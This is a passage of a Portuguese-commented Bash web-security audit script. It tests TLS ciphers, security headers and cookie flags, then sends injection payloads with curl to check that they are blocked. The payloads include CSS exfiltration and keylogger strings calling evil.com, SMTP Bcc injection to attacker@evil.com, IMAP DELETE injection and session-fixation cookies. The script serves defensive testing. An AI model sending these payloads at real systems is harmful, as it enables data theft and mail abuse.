    # TLSv1.2 - OK se com ciphers fortes
    test_protocol "tls1_2" "TLSv1.2 (Seguro com bons ciphers)" "no"
    
    # TLSv1.3 - Recomendado
    test_protocol "tls1_3" "TLSv1.3 (Recomendado)" "no"
    
    print_subsection "Cipher Suites Vulneráveis (devem ser BLOQUEADOS)"
    
    # NULL ciphers - Sem criptografia
    test_cipher "NULL" "NULL ciphers (sem criptografia)" "yes"
    test_cipher "eNULL" "eNULL (encryption NULL)" "yes"
    test_cipher "aNULL" "aNULL (auth NULL)" "yes"
    
    # EXPORT ciphers - Fracos por design (FREAK attack)
    test_cipher "EXPORT" "EXPORT ciphers (FREAK attack)" "yes"
    test_cipher "EXP" "EXP ciphers (export grade)" "yes"
    
    # DES ciphers - Chave muito curta
    test_cipher "DES" "DES (56-bit - muito fraco)" "yes"
    test_cipher "DES-CBC-SHA" "DES-CBC-SHA (single DES)" "yes"
    
    # 3DES/Triple DES - Vulnerável ao SWEET32
    test_cipher "3DES" "3DES/Triple DES (SWEET32)" "yes"
    test_cipher "DES-CBC3-SHA" "DES-CBC3-SHA (3DES)" "yes"
    
    # RC4 - Múltiplas vulnerabilidades
    test_cipher "RC4" "RC4 (múltiplas vulnerabilidades)" "yes"
    test_cipher "RC4-SHA" "RC4-SHA" "yes"
    test_cipher "RC4-MD5" "RC4-MD5" "yes"
    
    # MD5 - Hash fraco
    test_cipher "MD5" "MD5 MAC (hash fraco)" "yes"
    
    # Anonymous ciphers - Sem autenticação (MitM)
    test_cipher "ADH" "ADH (Anonymous DH)" "yes"
    test_cipher "AECDH" "AECDH (Anonymous ECDH)" "yes"
    
    # LOW strength ciphers
    test_cipher "LOW" "LOW strength ciphers" "yes"
    
    # IDEA - Patente expirada, considerado fraco
    test_cipher "IDEA" "IDEA cipher" "yes"
    
    # SEED - Cipher coreano, pouco auditado
    test_cipher "SEED" "SEED cipher" "yes"
    
    # Camellia - Aceitável mas prefira AES
    test_cipher "CAMELLIA128" "CAMELLIA-128" "no"
    
    print_subsection "Cipher Suites Seguros (devem ser SUPORTADOS)"
    
    # AES-GCM - Recomendado
    test_cipher "AES128-GCM-SHA256" "AES128-GCM-SHA256" "no"
    test_cipher "AES256-GCM-SHA384" "AES256-GCM-SHA384" "no"
    
    # ECDHE - Perfect Forward Secrecy
    test_cipher "ECDHE-RSA-AES128-GCM-SHA256" "ECDHE-RSA-AES128-GCM-SHA256 (PFS)" "no"
    test_cipher "ECDHE-RSA-AES256-GCM-SHA384" "ECDHE-RSA-AES256-GCM-SHA384 (PFS)" "no"
    test_cipher "ECDHE-ECDSA-AES128-GCM-SHA256" "ECDHE-ECDSA-AES128-GCM-SHA256 (PFS)" "no"
    test_cipher "ECDHE-ECDSA-AES256-GCM-SHA384" "ECDHE-ECDSA-AES256-GCM-SHA384 (PFS)" "no"
    
    # ChaCha20-Poly1305 - Excelente para mobile
    test_cipher "ECDHE-RSA-CHACHA20-POLY1305" "ECDHE-RSA-CHACHA20-POLY1305" "no"
    test_cipher "ECDHE-ECDSA-CHACHA20-POLY1305" "ECDHE-ECDSA-CHACHA20-POLY1305" "no"
    
    print_subsection "Curvas ECDH (Fracas devem ser BLOQUEADAS)"
    
    # Função para testar curvas
    test_curve() {
        local curve="$1"
        local curve_name="$2"
        local should_fail="$3"
        local result_text=""
        
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        local result
        result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -curves "$curve" 2>&1)
        
        if echo "$result" | grep -q "Cipher is"; then
            if [ "$should_fail" = "yes" ]; then
                result_text="FAIL"
                FAILED_TESTS=$((FAILED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[FAIL] Curva $curve_name - Curva fraca aceita" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                    echo -e "  ${RED}[✗]${NC} Curva $curve_name - ${RED}VULNERÁVEL${NC} (curva fraca aceita)"
                fi
            else
                result_text="PASS"
                PASSED_TESTS=$((PASSED_TESTS + 1))
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} Curva $curve_name - ${GREEN}SUPORTADA${NC}"
                fi
            fi
        else
            if [ "$should_fail" = "yes" ]; then
                result_text="PASS"
                PASSED_TESTS=$((PASSED_TESTS + 1))
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} Curva $curve_name - ${GREEN}BLOQUEADA${NC}"
                fi
            else
                if [ "$FILTER" = "all" ]; then
                    echo -e "  ${YELLOW}[?]${NC} Curva $curve_name - ${YELLOW}NÃO SUPORTADA${NC}"
                fi
            fi
        fi
    }
    
    # Curvas fracas (< 224 bits)
    test_curve "secp160k1" "secp160k1 (160-bit - FRACA)" "yes"
    test_curve "secp160r1" "secp160r1 (160-bit - FRACA)" "yes"
    test_curve "secp160r2" "secp160r2 (160-bit - FRACA)" "yes"
    test_curve "secp192k1" "secp192k1 (192-bit - FRACA)" "yes"
    test_curve "prime192v1" "prime192v1/P-192 (192-bit - FRACA)" "yes"
    
    # Curvas seguras
    test_curve "prime256v1" "prime256v1/P-256 (256-bit)" "no"
    test_curve "secp384r1" "secp384r1/P-384 (384-bit)" "no"
    test_curve "secp521r1" "secp521r1/P-521 (521-bit)" "no"
    test_curve "X25519" "X25519 (Curve25519 - Recomendada)" "no"
    test_curve "X448" "X448 (Curve448)" "no"
    
    print_subsection "Vulnerabilidades Conhecidas"
    
    # CRIME - Compressão TLS
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    local compression
    compression=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>&1 | grep "Compression:")
    if echo "$compression" | grep -qi "NONE"; then
        echo -e "  ${GREEN}[✓]${NC} CRIME (TLS Compression) - ${GREEN}PROTEGIDO${NC} (compressão desabilitada)"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "  ${RED}[✗]${NC} CRIME (TLS Compression) - ${RED}VULNERÁVEL${NC} (compressão habilitada)"
        FAILED_TESTS=$((FAILED_TESTS + 1))
    fi
    
    # Heartbleed (verificação básica)
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    if command -v timeout &> /dev/null; then
        local hb_result
        hb_result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -tlsextdebug 2>&1 | grep -i "heartbeat")
        if [ -n "$hb_result" ]; then
            echo -e "  ${YELLOW}[?]${NC} Heartbleed - ${YELLOW}HEARTBEAT HABILITADO${NC} (verificar versão OpenSSL do servidor)"
        else
            echo -e "  ${GREEN}[✓]${NC} Heartbleed - ${GREEN}PROTEGIDO${NC} (heartbeat não detectado)"
            PASSED_TESTS=$((PASSED_TESTS + 1))
        fi
    fi
    
    # Renegociação segura
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    local reneg
    reneg=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>&1 | grep -i "renegotiation")
    if echo "$reneg" | grep -qi "secure"; then
        echo -e "  ${GREEN}[✓]${NC} Renegociação Segura - ${GREEN}HABILITADA${NC}"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "  ${YELLOW}[?]${NC} Renegociação Segura - ${YELLOW}VERIFICAR${NC}"
    fi
    
    # OCSP Stapling
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    local ocsp
    ocsp=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -status 2>&1 | grep -i "OCSP Response Status")
    if [ -n "$ocsp" ]; then
        echo -e "  ${GREEN}[✓]${NC} OCSP Stapling - ${GREEN}HABILITADO${NC}"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "  ${YELLOW}[?]${NC} OCSP Stapling - ${YELLOW}NÃO DETECTADO${NC}"
    fi
    
    print_subsection "Informações do Certificado"
    
    # Obter informações do certificado
    local cert_info
    cert_info=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>/dev/null | openssl x509 -noout -dates -subject -issuer 2>/dev/null)
    
    if [ -n "$cert_info" ]; then
        echo -e "  ${CYAN}Certificado SSL/TLS:${NC}"
        echo "$cert_info" | while read -r line; do
            echo -e "    $line"
        done
        
        # Verificar validade
        local not_after
        not_after=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>/dev/null | openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2)
        if [ -n "$not_after" ]; then
            local expiry_epoch now_epoch days_left
            expiry_epoch=$(date -d "$not_after" +%s 2>/dev/null)
            now_epoch=$(date +%s)
            if [ -n "$expiry_epoch" ]; then
                days_left=$(( (expiry_epoch - now_epoch) / 86400 ))
                if [ $days_left -lt 0 ]; then
                    echo -e "  ${RED}❌ CERTIFICADO EXPIRADO!${NC}"
                elif [ $days_left -lt 30 ]; then
                    echo -e "  ${YELLOW}⚠️  Certificado expira em $days_left dias!${NC}"
                else
                    echo -e "  ${GREEN}✓ Certificado válido por mais $days_left dias${NC}"
                fi
            fi
        fi
        
        # Verificar tamanho da chave
        local key_size
        key_size=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>/dev/null | openssl x509 -noout -text 2>/dev/null | grep "Public-Key:" | grep -oP '\d+')
        if [ -n "$key_size" ]; then
            TOTAL_TESTS=$((TOTAL_TESTS + 1))
            if [ "$key_size" -lt 2048 ]; then
                echo -e "  ${RED}[✗]${NC} Tamanho da chave: ${RED}${key_size} bits (FRACO - mínimo 2048)${NC}"
                FAILED_TESTS=$((FAILED_TESTS + 1))
            elif [ "$key_size" -lt 4096 ]; then
                echo -e "  ${GREEN}[✓]${NC} Tamanho da chave: ${GREEN}${key_size} bits (adequado)${NC}"
                PASSED_TESTS=$((PASSED_TESTS + 1))
            else
                echo -e "  ${GREEN}[✓]${NC} Tamanho da chave: ${GREEN}${key_size} bits (forte)${NC}"
                PASSED_TESTS=$((PASSED_TESTS + 1))
            fi
        fi
    fi
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Recomendações de Hardening SSL/TLS:${NC}"
    echo -e "  ${YELLOW}• Desabilitar:${NC} SSLv2, SSLv3, TLSv1.0, TLSv1.1"
    echo -e "  ${YELLOW}• Habilitar:${NC} TLSv1.2 e TLSv1.3 apenas"
    echo -e "  ${YELLOW}• Ciphers Nginx:${NC}"
    echo -e "    ssl_protocols TLSv1.2 TLSv1.3;"
    echo -e "    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    echo -e "                 ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    echo -e "                 ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';"
    echo -e "    ssl_prefer_server_ciphers on;"
    echo -e "    ssl_ecdh_curve X25519:prime256v1:secp384r1;"
    echo -e "  ${YELLOW}• HSTS:${NC} add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# CLICKJACKING PROTECTION (X-Frame-Options / CSP frame-ancestors)
#==============================================================================
test_clickjacking() {
    print_section "🖼️ TESTES DE PROTEÇÃO CONTRA CLICKJACKING"
    
    echo -e "  ${YELLOW}ℹ️  Verificando headers de proteção contra Clickjacking${NC}"
    echo -e "  ${YELLOW}   X-Frame-Options e CSP frame-ancestors devem estar presentes${NC}"
    echo ""
    
    print_subsection "Verificação de Headers de Proteção"
    
    # Obter headers da resposta
    local headers
    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
    
    # Teste X-Frame-Options
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    if echo "$headers" | grep -qi "X-Frame-Options"; then
        local xfo_value
        xfo_value=$(echo "$headers" | grep -i "X-Frame-Options" | head -1 | cut -d':' -f2 | tr -d ' \r')
        if [[ "${xfo_value^^}" == "DENY" ]] || [[ "${xfo_value^^}" == "SAMEORIGIN" ]]; then
            PASSED_TESTS=$((PASSED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[PASS] X-Frame-Options: $xfo_value" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                echo -e "  ${GREEN}[✓]${NC} X-Frame-Options: ${GREEN}$xfo_value${NC}"
            fi
        else
            FAILED_TESTS=$((FAILED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] X-Frame-Options: Valor fraco ($xfo_value)" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                echo -e "  ${RED}[✗]${NC} X-Frame-Options: ${RED}Valor fraco ($xfo_value)${NC}"
            fi
        fi
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        [ -n "$OUTPUT_FILE" ] && echo "[FAIL] X-Frame-Options: AUSENTE" >> "$OUTPUT_FILE"
        if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
            echo -e "  ${RED}[✗]${NC} X-Frame-Options: ${RED}AUSENTE${NC} - Vulnerável a Clickjacking!"
        fi
    fi
    
    # Teste CSP frame-ancestors
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    if echo "$headers" | grep -qi "Content-Security-Policy"; then
        local csp_value
        csp_value=$(echo "$headers" | grep -i "Content-Security-Policy" | head -1)
        if echo "$csp_value" | grep -qi "frame-ancestors"; then
            PASSED_TESTS=$((PASSED_TESTS + 1))
            local frame_ancestors
            frame_ancestors=$(echo "$csp_value" | grep -oP "frame-ancestors[^;]+" | head -1)
            [ -n "$OUTPUT_FILE" ] && echo "[PASS] CSP frame-ancestors presente" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                echo -e "  ${GREEN}[✓]${NC} CSP frame-ancestors: ${GREEN}Configurado${NC}"
            fi
        else
            [ -n "$OUTPUT_FILE" ] && echo "[INFO] CSP presente mas sem frame-ancestors" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ]; then
                echo -e "  ${YELLOW}[?]${NC} CSP presente mas ${YELLOW}sem frame-ancestors${NC}"
            fi
        fi
    else
        [ -n "$OUTPUT_FILE" ] && echo "[INFO] Content-Security-Policy: AUSENTE" >> "$OUTPUT_FILE"
        if [ "$FILTER" = "all" ]; then
            echo -e "  ${YELLOW}[?]${NC} Content-Security-Policy: ${YELLOW}AUSENTE${NC}"
        fi
    fi
    
    print_subsection "Testes de Bypass de Clickjacking"
    
    # Testar com diferentes headers que podem bypassar proteções
    test_curl "Clickjacking: Request normal" "allow" -A "$UA" -Lk "$URL"
    test_curl "Clickjacking: X-Frame-Options: ALLOW" "block" -A "$UA" -Lk -H "X-Frame-Options: ALLOW" "$URL"
    test_curl "Clickjacking: X-Frame-Options vazio" "block" -A "$UA" -Lk -H "X-Frame-Options:" "$URL"
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Recomendações Anti-Clickjacking:${NC}"
    echo -e "  ${YELLOW}• Nginx:${NC} add_header X-Frame-Options \"DENY\" always;"
    echo -e "  ${YELLOW}• CSP:${NC} add_header Content-Security-Policy \"frame-ancestors 'none';\" always;"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# SECURITY HEADERS CHECK (Headers de Segurança Essenciais)
#==============================================================================
test_security_headers() {
    print_section "🔒 VERIFICAÇÃO DE HEADERS DE SEGURANÇA"
    
    echo -e "  ${YELLOW}ℹ️  Verificando presença e configuração de headers de segurança${NC}"
    echo ""
    
    # Obter headers da resposta
    local headers
    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
    
    print_subsection "Headers de Segurança Essenciais"
    
    # Array de headers a verificar: "nome|deve_conter|descrição"
    local security_headers=(
        "X-Content-Type-Options|nosniff|Previne MIME-type sniffing (XSSI)"
        "X-XSS-Protection|1|Proteção XSS do navegador (legacy)"
        "Referrer-Policy||Controla envio de Referer"
        "Permissions-Policy||Controla APIs do navegador"
        "Strict-Transport-Security|max-age|HSTS - Força HTTPS"
        "X-Permitted-Cross-Domain-Policies||Controla políticas cross-domain"
        "Cross-Origin-Opener-Policy||COOP - Isolamento de origem"
        "Cross-Origin-Resource-Policy||CORP - Política de recursos"
        "Cross-Origin-Embedder-Policy||COEP - Política de embedder"
    )
    
    for header_info in "${security_headers[@]}"; do
        local header_name header_value header_desc
        header_name=$(echo "$header_info" | cut -d'|' -f1)
        header_value=$(echo "$header_info" | cut -d'|' -f2)
        header_desc=$(echo "$header_info" | cut -d'|' -f3)
        
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        if echo "$headers" | grep -qi "^${header_name}:"; then
            local actual_value
            actual_value=$(echo "$headers" | grep -i "^${header_name}:" | head -1 | cut -d':' -f2- | tr -d '\r' | xargs)
            
            if [ -n "$header_value" ]; then
                if echo "$actual_value" | grep -qi "$header_value"; then
                    PASSED_TESTS=$((PASSED_TESTS + 1))
                    [ -n "$OUTPUT_FILE" ] && echo "[PASS] $header_name: $actual_value" >> "$OUTPUT_FILE"
                    if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                        echo -e "  ${GREEN}[✓]${NC} $header_name: ${GREEN}$actual_value${NC}"
                    fi
                else
                    FAILED_TESTS=$((FAILED_TESTS + 1))
                    [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $header_name: Valor incorreto ($actual_value)" >> "$OUTPUT_FILE"
                    if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                        echo -e "  ${YELLOW}[!]${NC} $header_name: ${YELLOW}$actual_value${NC} (esperado: $header_value)"
                    fi
                fi
            else
                PASSED_TESTS=$((PASSED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $header_name: Presente" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} $header_name: ${GREEN}$actual_value${NC}"
                fi
            fi
        else
            FAILED_TESTS=$((FAILED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $header_name: AUSENTE - $header_desc" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                echo -e "  ${RED}[✗]${NC} $header_name: ${RED}AUSENTE${NC} - $header_desc"
            fi
        fi
    done
    
    print_subsection "Headers que Devem Estar AUSENTES"
    
    # Headers que não devem existir (information disclosure)
    local bad_headers=(
        "Server|Revela versão do servidor"
        "X-Powered-By|Revela tecnologia backend"
        "X-AspNet-Version|Revela versão ASP.NET"
        "X-AspNetMvc-Version|Revela versão MVC"
        "X-Generator|Revela CMS/framework"
    )
    
    for header_info in "${bad_headers[@]}"; do
        local header_name header_desc
        header_name=$(echo "$header_info" | cut -d'|' -f1)
        header_desc=$(echo "$header_info" | cut -d'|' -f2)
        
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        local header_found
        header_found=$(echo "$headers" | grep -i "^${header_name}:" | head -1)
        
        if [ -n "$header_found" ]; then
            FAILED_TESTS=$((FAILED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $header_name presente - $header_desc" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                echo -e "  ${RED}[✗]${NC} $header_name: ${RED}PRESENTE${NC} - $header_desc"
                echo -e "      ${YELLOW}→ Valor: $(echo "$header_found" | cut -d':' -f2-)${NC}"
            fi
        else
            PASSED_TESTS=$((PASSED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[PASS] $header_name: Corretamente removido" >> "$OUTPUT_FILE"
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                echo -e "  ${GREEN}[✓]${NC} $header_name: ${GREEN}Corretamente removido${NC}"
            fi
        fi
    done
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Configuração Nginx Recomendada:${NC}"
    echo -e "  ${YELLOW}add_header X-Content-Type-Options \"nosniff\" always;${NC}"
    echo -e "  ${YELLOW}add_header X-Frame-Options \"DENY\" always;${NC}"
    echo -e "  ${YELLOW}add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;${NC}"
    echo -e "  ${YELLOW}add_header Permissions-Policy \"geolocation=(), microphone=(), camera=()\" always;${NC}"
    echo -e "  ${YELLOW}server_tokens off;${NC}"
    echo -e "  ${YELLOW}more_clear_headers Server;${NC}"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# SESSION SECURITY (Cookies Flags - HttpOnly, Secure, SameSite)
#==============================================================================
test_session_security() {
    print_section "🍪 TESTES DE SEGURANÇA DE SESSÃO (Cookies)"
    
    echo -e "  ${YELLOW}ℹ️  Verificando flags de segurança em cookies${NC}"
    echo -e "  ${YELLOW}   Cookies devem ter: HttpOnly, Secure, SameSite${NC}"
    echo ""
    
    # Obter headers da resposta (incluindo cookies)
    local headers
    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
    
    # Extrair todos os Set-Cookie headers
    local cookies
    cookies=$(echo "$headers" | grep -i "^Set-Cookie:")
    
    if [ -z "$cookies" ]; then
        echo -e "  ${YELLOW}[?]${NC} Nenhum cookie Set-Cookie encontrado na resposta inicial"
        echo -e "  ${YELLOW}   Testando em página de login...${NC}"
        
        # Tentar obter cookies de páginas comuns
        for login_path in "/wp-login.php" "/admin" "/login" "/user/login" "/auth/login"; do
            local login_headers
            login_headers=$(curl -sI -A "$UA" -Lk "${URL}${login_path}" 2>/dev/null)
            local login_cookies
            login_cookies=$(echo "$login_headers" | grep -i "^Set-Cookie:")
            if [ -n "$login_cookies" ]; then
                cookies="$login_cookies"
                echo -e "  ${GREEN}   Cookies encontrados em ${login_path}${NC}"
                break
            fi
        done
    fi
    
    if [ -z "$cookies" ]; then
        echo -e "  ${YELLOW}[!]${NC} Nenhum cookie encontrado para análise"
        return
    fi
    
    print_subsection "Análise de Cookies"
    
    echo "$cookies" | while read -r cookie_line; do
        local cookie_name
        cookie_name=$(echo "$cookie_line" | sed 's/^Set-Cookie: *//i' | cut -d'=' -f1)
        
        echo ""
        echo -e "  ${CYAN}Cookie: ${BOLD}$cookie_name${NC}"
        
        # Verificar HttpOnly
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        if echo "$cookie_line" | grep -qi "HttpOnly"; then
            PASSED_TESTS=$((PASSED_TESTS + 1))
            echo -e "    ${GREEN}[✓]${NC} HttpOnly: ${GREEN}Presente${NC}"
        else
            FAILED_TESTS=$((FAILED_TESTS + 1))
            echo -e "    ${RED}[✗]${NC} HttpOnly: ${RED}AUSENTE${NC} - Cookie acessível via JavaScript!"
        fi
        
        # Verificar Secure
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        if echo "$cookie_line" | grep -qi "Secure"; then
            PASSED_TESTS=$((PASSED_TESTS + 1))
            echo -e "    ${GREEN}[✓]${NC} Secure: ${GREEN}Presente${NC}"
        else
            FAILED_TESTS=$((FAILED_TESTS + 1))
            echo -e "    ${RED}[✗]${NC} Secure: ${RED}AUSENTE${NC} - Cookie enviado em conexões HTTP!"
        fi
        
        # Verificar SameSite
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        if echo "$cookie_line" | grep -qi "SameSite"; then
            local samesite_value
            samesite_value=$(echo "$cookie_line" | grep -oP "SameSite=\K[^;]+" | tr -d ' ')
            if [[ "${samesite_value^^}" == "STRICT" ]] || [[ "${samesite_value^^}" == "LAX" ]]; then
                PASSED_TESTS=$((PASSED_TESTS + 1))
                echo -e "    ${GREEN}[✓]${NC} SameSite: ${GREEN}$samesite_value${NC}"
            else
                FAILED_TESTS=$((FAILED_TESTS + 1))
                echo -e "    ${YELLOW}[!]${NC} SameSite: ${YELLOW}$samesite_value${NC} (considere Strict ou Lax)"
            fi
        else
            FAILED_TESTS=$((FAILED_TESTS + 1))
            echo -e "    ${RED}[✗]${NC} SameSite: ${RED}AUSENTE${NC} - Vulnerável a CSRF!"
        fi
        
        # Verificar Path
        if echo "$cookie_line" | grep -qi "Path="; then
            local path_value
            path_value=$(echo "$cookie_line" | grep -oP "Path=\K[^;]+" | tr -d ' ')
            echo -e "    ${CYAN}[i]${NC} Path: $path_value"
        fi
        
        # Verificar Domain
        if echo "$cookie_line" | grep -qi "Domain="; then
            local domain_value
            domain_value=$(echo "$cookie_line" | grep -oP "Domain=\K[^;]+" | tr -d ' ')
            echo -e "    ${CYAN}[i]${NC} Domain: $domain_value"
        fi
    done
    
    print_subsection "Testes de Session Fixation"
    test_curl "Session: Cookie injetado" "block" -A "$UA" -Lk --cookie "PHPSESSID=fixedsession123" "$URL"
    test_curl "Session: Cookie JSESSIONID" "block" -A "$UA" -Lk --cookie "JSESSIONID=fixedsession123" "$URL"
    test_curl "Session: WordPress cookie" "block" -A "$UA" -Lk --cookie "wordpress_logged_in=admin" "$URL"
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Configuração PHP Recomendada (php.ini):${NC}"
    echo -e "  ${YELLOW}session.cookie_httponly = On${NC}"
    echo -e "  ${YELLOW}session.cookie_secure = On${NC}"
    echo -e "  ${YELLOW}session.cookie_samesite = Strict${NC}"
    echo -e "  ${YELLOW}session.use_strict_mode = On${NC}"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# CSS INJECTION TESTS
#==============================================================================
test_css_injection() {
    print_section "🎨 TESTES DE CSS INJECTION"
    
    print_subsection "CSS Injection em Parâmetros"
    test_curl "CSS: expression()" "block" -A "$UA" -Lk "${URL}?style=expression(alert(1))"
    test_curl "CSS: url() data" "block" -A "$UA" -Lk "${URL}?css=background:url(data:text/html,<script>alert(1)</script>)"
    test_curl "CSS: import" "block" -A "$UA" -Lk "${URL}?style=@import'http://evil.com/evil.css'"
    test_curl "CSS: behavior" "block" -A "$UA" -Lk "${URL}?css=behavior:url(script.htc)"
    test_curl "CSS: moz-binding" "block" -A "$UA" -Lk "${URL}?css=-moz-binding:url(http://evil.com/xss.xml)"
    test_curl "CSS: charset trick" "block" -A "$UA" -Lk "${URL}?css=@charset\"UTF-7\";+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
    
    print_subsection "CSS Injection em Headers"
    test_curl "CSS: Style header" "block" -A "$UA" -Lk -H "X-Custom-CSS: expression(alert(1))" "$URL"
    test_curl "CSS: Content-Style-Type" "block" -A "$UA" -Lk -H "Content-Style-Type: text/css; expression(alert(1))" "$URL"
    
    print_subsection "CSS Exfiltration Payloads"
    test_curl "CSS: attribute selector exfil" "block" -A "$UA" -Lk "${URL}?css=input[value^='a']{background:url(http://evil.com/?a)}"
    test_curl "CSS: font-face exfil" "block" -A "$UA" -Lk "${URL}?css=@font-face{src:url(http://evil.com/exfil)}"
    
    print_subsection "CSS Keylogger Payloads"
    test_curl "CSS: input keylogger" "block" -A "$UA" -Lk "${URL}?css=input[value\$='password']{background:url(http://evil.com/log)}"
}

#==============================================================================
# EMAIL INJECTION (IMAP/SMTP Injection)
#==============================================================================
test_email_injection() {
    print_section "📧 TESTES DE EMAIL INJECTION (IMAP/SMTP)"
    
    print_subsection "SMTP Header Injection"
    test_curl "SMTP: Bcc injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ABcc:attacker@evil.com" "$URL"
    test_curl "SMTP: Cc injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ACc:attacker@evil.com" "$URL"
    test_curl "SMTP: To injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ATo:attacker@evil.com" "$URL"
    test_curl "SMTP: Subject injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0ASubject:SPAM" "$URL"
    test_curl "SMTP: Content-Type injection" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0AContent-Type:text/html" "$URL"
    test_curl "SMTP: CRLF newline" "block" -A "$UA" -Lk -X POST -d "email=test@test.com%0D%0ABcc:attacker@evil.com" "$URL"
    
    print_subsection "IMAP Injection"
    test_curl "IMAP: Command injection" "block" -A "$UA" -Lk "${URL}?mailbox=INBOX%0ASELECT+OUTBOX"
    test_curl "IMAP: Search injection" "block" -A "$UA" -Lk "${URL}?search=FROM+admin%0ADELETE+1:*"
    test_curl "IMAP: Fetch injection" "block" -A "$UA" -Lk "${URL}?msg=1%0AFETCH+1:*+BODY[]"
    
    print_subsection "Email em Parâmetros"
